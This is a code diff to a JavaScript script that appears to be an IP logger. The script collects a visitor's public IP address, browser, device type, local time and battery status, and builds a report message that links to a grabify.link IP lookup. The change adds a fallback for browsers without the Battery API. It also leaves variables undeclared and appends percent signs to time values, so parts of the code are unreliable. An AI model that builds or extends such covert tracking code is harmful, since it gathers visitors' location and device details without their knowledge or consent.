@@ -113,7 +113,13 @@ function getPublicIPAddress() {
 }
 
 function getDaBattery(){
-	return navigator.getBattery()
+	if(navigator.getBattery){
+    return navigator.getBattery()
+}
+else{
+   return "N/A"
+}
+	
 }
 
 	
@@ -150,6 +156,17 @@ const browser = detectBrowser();
   // Example usage:
   const batteryInfo = await getDaBattery();
 
+let batteryLevel = "N/A";
+let batteryCharging = "N/A";
+
+if (batteryInfo !== "N/A") {
+batteryLevel = `${batteryInfo.level * 100}%`;
+batteryCharging = batteryInfo.charging ? "Yes" : "No";
+batteryChargeTime = `${batteryInfo.chargingTime}%`;
+batteryDishargeTime = `${batteryInfo.dischargingTime}%`;
+}
+
+
 
 	  
 const message = `
@@ -168,10 +185,10 @@ Check here to see IP VPN and Location status <https://grabify.link/ip-lookup/${i
 - Mobile User: ${isMobile}
 - User Date and Time: ${day}/${month}/${year} ${hours24}:${minutes}:${seconds}.${milliseconds} (${hours12}:${minutes}:${seconds} ${ampm})
 - Browser: ${browser}
-- Battery Level: ${batteryInfo.level*100} 
-- Battery Charging: ${batteryInfo.charging} 
-- Battery Charge Time: ${batteryInfo.chargingTime} 
-- Battery Life Time: ${batteryInfo.dischargingTime} 
+- Battery Level: ${batteryLevel} 
+- Battery Charging: ${batteryCharging} 
+- Battery Charge Time: ${batteryChargeTime} 
+- Battery Life Time: ${batteryDishargeTime} 
 
 `;
 	  
